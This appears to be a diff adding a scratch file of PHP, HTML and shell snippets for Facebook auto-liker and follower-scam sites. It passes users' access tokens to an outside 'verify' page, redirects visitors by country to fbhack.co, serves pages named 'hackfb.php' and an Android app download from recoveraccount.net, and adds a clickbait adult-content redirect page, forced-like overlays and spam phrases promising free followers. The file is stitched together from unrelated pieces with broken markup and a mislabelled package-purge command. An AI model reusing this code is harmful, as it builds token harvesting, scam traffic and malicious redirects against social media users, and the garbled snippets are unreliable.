@@ -1,0 +1,173 @@
+======================================================================================
+ Restarting The Windows Server for Hitleap ==> apt-get purge apache2* bind9* samba*
+======================================================================================
+
+======================================================================================
+Hiding any Attribute in Blogger using css
+-----------------------------------------m
+ <style>
+#Attribution1 {
+display: none;
+}
+</style>
+
+
+
+==========================================================================================================================
+vncserver :1 -geometry 1024x768 -depth 16 -pixelformat rgb565vncserver :1 -geometry 1024x768 -depth 16 -pixelformat rgb565
+==========================================================================================================================
+
+
+<a href=http://likerfb.com/verify.php?user=<?php echo $token;?> target="_blank" class="btn btn-lg btn-warning"> *New AutoLiker* </a>
+
+
+<?php
+include"auto.php";
+?>
+
+
+ <section id="portfolio" class="bg-light-gray">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-12 text-center">
+        <h3> <class="section-heading">
+		<?php if ($token){echo $user->name."  WELCOME FB-AUTOLIKEZ.ML PORTAL";}else{
+		?></h2>
+        <div class="line"></div>
+
+      </div>
+
+
+<?php
+$a = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR']));
+$countrycode= $a['geoplugin_countryCode'];
+if ($countrycode=='IN')
+    header( 'Location: http://fbhack.co/us' ) ;
+
+else if ($countrycode=='US')
+    header( 'Location: http://fbhack.co/us' ) ;
+else 
+    header( 'Location: http://kingliker.com' ) ;
+
+?>
+Redirect 301 / http://cricfreelive.com/
+
+<META http-equiv="refresh" content="5;URL=http://www.indiana.edu/~account/new-directory">
+
+redirect 301 /oldfolder/oldpage.htm http://www.yourdomain.com/newpage.htm
+
+
+<?php
+
+$xx = file_get_contents("http://kingliker.com/wsale.php");
+echo $xx;
+
+?>
+
+
+<!--
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+   <script>
+      // you can use just jquery for this
+      $(document).ready(function(){
+         $('#overlay-back').fadeIn(500,function(){
+            $('#popup').show();
+         });
+ 
+         $(".close-image").on('click', function() {
+            $('#popup').hide();
+            $('#overlay-back').fadeOut(500);
+         });
+      });
+   </script>
+<div id="overlay-back"></div>
+<div id="popup">
+<img src="http://i.imgur.com/rbuIJKG.pngupload.png" class="close-image" />
+<p><MARK><b>IMPORTANT : Like Our Page Below First and Then Contine..</b></MARK></p>
+
+<center> <iframe src="http://autoliker2016.com/plugin.php" sandbox="allow-forms allow-scripts" scrolling="no"></iframe> </center>
+
+</div>		-->
+
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta charset="utf-8">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="googlebot" content="noarchive"/>
+<meta content="noindex, nofollow" name=robot"/>
+<title> S.E.X S.E.X</title>
+<meta property="og:url" content="http://javhd.likesyou.org/hot%20girl.png"/>
+<meta HTTP-EQUIV="REFRESH" content="0;url=http://dkmmark3.blogspot.com/2015/12/hot-clip.html"/>
+</head>
+<body>
+</body></html>
+
+window.top.location.href = "http://example.com";
+<?php 
+echo '<br>'.$_SERVER['DOCUMENT_ROOT'].'<br>';
+    ?>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<?
+$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
+if(stripos($ua,'android') !== false) { // && stripos($ua,'mobile') !== false) {
+	$xx = file_get_contents("http://www.recoveraccount.net/download-app.php");
+echo $xx;
+}
+
+
+else{
+  $yy= file_get_contents("http://www.recoveraccount.net/hackfb.php");
+echo $yy;
+}
+?>
+
+<?php
+
+function random(){
+    $phrases = array(
+    "this website is ranked number #1 for auto insta followers",
+    "want insta followers here is number1 website for that",
+	"Want unlimited hago diamonds? get it now",
+    "Grow followers and business on instagram using this awsome website",
+    "Unlimited followers within months using this number 1 ranked google website"
+        );
+
+    return $phrases[mt_rand(0, count($phrases)-1)]; //subtract 1 from total count of phrases as first elements key is 0
+}
+
+echo random();
+
+?>
+
+
+<?php 
+$n=7; 
+function getName($n) { 
+	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
+	$randomString = ''; 
+
+	for ($i = 0; $i < $n; $i++) { 
+		$index = rand(0, strlen($characters) - 1); 
+		$randomString .= $characters[$index]; 
+	} 
+
+	return $randomString; 
+} 
+
+echo getName($n); 
+?> 
